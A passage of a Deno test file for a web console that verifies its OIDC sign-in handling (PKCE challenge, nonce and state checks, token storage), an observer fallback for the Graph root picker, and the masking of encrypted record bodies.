  assertEquals(u.searchParams.get("scope"), "openid profile email", "profile+email feed the enrollment record's display claims");
  const pending = JSON.parse(st.session["radia.oidc"]);
  assertEquals(u.searchParams.get("state"), pending.state, "the state in the URL is the stored one");
  assertEquals(u.searchParams.get("nonce"), pending.nonce);
  assertEquals(pending.route, "#feed", "the current tab survives the round trip");
  // The challenge really is S256(verifier): recompute it. A harness that only checked presence
  // would pass a page sending the verifier itself.
  const digest = new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(pending.verifier)));
  let bin = "";
  for (const b of digest) bin += String.fromCharCode(b);
  const expect = btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
  assertEquals(u.searchParams.get("code_challenge"), expect);
});

Deno.test("console: oidcFinish enforces the nonce and stores ONLY a run token", async () => {
  const idToken = (nonce: string) => {
    const b64 = (s: string) => btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
    return `${b64(JSON.stringify({ alg: "RS256" }))}.${b64(JSON.stringify({ sub: "u", nonce, name: "Demo Person" }))}.sig`;
  };
  const pending = { verifier: "v", nonce: "N1", tokenEndpoint: "http://idp.test/token", clientId: "console", route: "" };

  // The good path: exchange, nonce match, the space's runToken lands in sessionStorage, reload.
  const t = oidcHarness([
    { status: 200, json: { id_token: idToken("N1") } },
    { status: 201, json: { run: "run:x", agent: "human:oidc-a", runToken: "rt-1", expiresAt: "later" } },
  ]);
  await t.oidcFinish("code-1", pending);
  const st = t.state();
  assertEquals(st.session["radia.token"], "rt-1");
  assertEquals(st.AUTH_TOKEN, "rt-1");
  assert(st.reloaded, "a successful sign-in re-enters through start()");
  assertEquals(st.session["radia.definition"], undefined, "an OIDC session has no durable half to remember");
  assertEquals(st.session["radia.oidc-name"], "Demo Person", "the IdP display name is kept for the pill (decoration, client-side)");
  assertEquals(t.calls[1].url, "/v0/sessions/oidc", "the id_token goes to the space, nowhere else");
  assert(String(t.calls[0].body).includes("code_verifier=v"), "the exchange carries the PKCE verifier");

  // A swapped id_token (right issuer, wrong dance): the nonce is the page's ONLY replay check,
  // because the space never saw it.
  const t2 = oidcHarness([{ status: 200, json: { id_token: idToken("OTHER") } }]);
  await t2.oidcFinish("code-2", pending);
  const st2 = t2.state();
  assert(String(st2.signInShown).includes("nonce"), String(st2.signInShown));
  assertEquals(st2.session["radia.token"], undefined, "nothing is stored from a token that failed the nonce");
  assertEquals(t2.calls.length, 1, "the space is never asked to mint from it");

  // The space refusing (revoked mapping, misconfigured issuer): the reason reaches the person.
  const t3 = oidcHarness([
    { status: 200, json: { id_token: idToken("N1") } },
    { status: 401, json: { detail: "this identity's mapping was retired; sign-in is refused" } },
  ]);
  await t3.oidcFinish("code-3", pending);
  assert(String(t3.state().signInShown).includes("retired"), String(t3.state().signInShown));
});

Deno.test("console: the IdP return leg is consumed once, checked against state, and stripped", () => {
  // start() is not extracted (it drags the whole page in); the return-leg contract is structural:
  // the query branch must spend the pending dance BEFORE deciding anything, compare state, strip
  // the query via replaceState restoring the carried route, and never loop an error back into
  // the dance.
  const start = extractFunction(html, "start");
  const leg = start.slice(start.indexOf('qs.has("code")'));
  assert(start.includes('new URLSearchParams(location.search)'), "start() never reads the query string");
  const spend = leg.indexOf('sessionStorage.removeItem("radia.oidc")');
  assert(spend >= 0, "the pending dance is never spent");
  assert(spend < leg.indexOf('if (qs.has("error"))'), "…and must be spent before the error branch, or a refused dance stays replayable");
  assert(spend < leg.indexOf("oidcFinish("), "…and before the exchange");
  assert(leg.includes('qs.get("state") !== pending.state'), "the state echo is never compared");
  assert(/history\.replaceState\(null, "", location\.pathname \+ \(\(pending && pending\.route\) \|\| ""\)\)/.test(leg), "the query is not stripped, or the carried route is dropped");
});

Deno.test("console: the SSO button appears exactly when health advertises an issuer", async () => {
  const showSignInHarness = (health: unknown) => {
    const src = `
      const els = {};
      const $ = (id) => (els[id] ??= { style: {}, innerHTML: "", focus: () => {} });
      const fetch = async () => ({ ok: true, json: async () => (health) });
      const note = () => {};
      const document = { querySelector: () => ({ style: {} }) };
      const sessionStorage = { removeItem: () => {} };
      let AUTH_TOKEN = null, OPEN_OPERATOR = false, OIDC_INFO = null, healthTimer = null;
      async ${extractFunction(html, "showSignIn")}
      return { showSignIn, els, info: () => OIDC_INFO };
    `;
    // deno-lint-ignore no-explicit-any
    return new Function("health", src)(health) as any;
  };
  const withSso = showSignInHarness({ principal: "anonymous", oidc: { issuer: "http://idp.test", clientId: "console" } });
  await withSso.showSignIn("");
  assertEquals(withSso.els["signin-oidc"].style.display, "", "the button is offered when the space trusts an issuer");
  assertEquals(withSso.info()?.clientId, "console", "oidcStart reads what the probe stored");

  const without = showSignInHarness({ principal: "anonymous" });
  await without.showSignIn("");
  assertEquals(without.els["signin-oidc"].style.display, "none", "no issuer, no button: it would only 403");
});

Deno.test("console: the Graph root picker serves an OBSERVER through the event log", async () => {
  // `observe` opens the ops plane and not coordination reads, and the picker's listing is a
  // coordination query. Seen live: every tab worked for an observer except Graph, which 403'd
  // on `conversation` — while the graph WALK it feeds is an ops read the observer can make.
  // The fallback lists recent roots from the event log's tail instead of rendering the refusal.
  const harness = (script: { status: number; json?: unknown }[]) => {
    const src = `
      const els = {};
      const $ = (id) => (els[id] ??= { innerHTML: "", value: "conversation", style: {} });
      const calls = [];
      const api = async (method, path, body) => {
        calls.push({ method, path });
        const next = script.length > 1 ? script.shift() : script[0];
        return { ok: next.status < 400, status: next.status, data: next.json ?? {} };
      };
      ${extractFunction(html, "esc")}
      const errText = (r) => "err";
      const window = {};
      async ${extractFunction(html, "loadGraphRoots")}
      return { loadGraphRoots, els, calls };
    `;
    // deno-lint-ignore no-explicit-any
    return new Function("script", src)(script) as any;
  };

  // 403 on the coordination read -> the event-log fallback renders pick buttons.
  const t = harness([
    { status: 403, json: {} },
    { status: 200, json: { events: [
      { operation: "put", kind: "conversation", recordId: "01AAAAAAAAAAAAAAAAAAAAAAAA" },
      { operation: "put", kind: "message", recordId: "01BBBBBBBBBBBBBBBBBBBBBBBB" }, // wrong kind: filtered
      { operation: "put", kind: "conversation", recordId: "01CCCCCCCCCCCCCCCCCCCCCCCC" },
      { operation: "take", kind: "conversation", recordId: "01DDDDDDDDDDDDDDDDDDDDDDDD" }, // not a creation
      { operation: "put", kind: "conversation", recordId: "01CCCCCCCCCCCCCCCCCCCCCCCC" }, // dupe
    ] } },
  ]);
  await t.loadGraphRoots();
  assertEquals(t.calls.map((c: { path: string }) => c.path), ["/v0/records/query", "/v0/ops/events?tail=500"]);
  const out = t.els["g-roots"].innerHTML;
  assert(out.includes("CCCCCC") && out.includes("AAAAAA"), out.slice(0, 120));
  assert(!out.includes("BBBBBB") && !out.includes("DDDDDD"), "wrong kind or non-creation leaked into the picker");
  assert(out.indexOf("CCCCCC") < out.indexOf("AAAAAA"), "newest first");
  assert(out.includes("query grant"), "…and it says why this is the fallback view");

  // Any other failure is still shown as the refusal it is, not silently retried through ops.
  const t2 = harness([{ status: 500, json: {} }]);
  await t2.loadGraphRoots();
  assertEquals(t2.calls.length, 1, "only a 403 reroutes; a 500 is an error to show");
  assert(t2.els["g-roots"].innerHTML.includes("note err"));
});

Deno.test("console: an encrypted body is shown as «encrypted», never as its ciphertext", () => {
  const isEncrypted = new Function(`${extractFunction(html, "isEncrypted")}; return isEncrypted;`)() as (
    rec: unknown,
  ) => boolean;

  assert(isEncrypted({ body: { enc: "v1", content: "Y2lwaGVy" } }));
  assert(!isEncrypted({ body: { content: "hello" } }));
  assert(!isEncrypted({ body: {} }));
  assert(!isEncrypted({}), "a record with no body is not encrypted, it is empty");
  assert(!isEncrypted(null));

  // The console holds no key and never will, so the RULE is that it recognises the marker rather
  // than trying to read past it. Both render paths consult the same predicate.
  const src = html.slice(html.indexOf("function renderRecordList"));
  assert(/isEncrypted\(rec\)\s*\?\s*`<span class="muted">«encrypted»<\/span>`/.test(src),
    "the list preview masks a marked body");
  assert(html.includes("«encrypted» — this body's prose is ciphertext"), "the detail view says why");
});
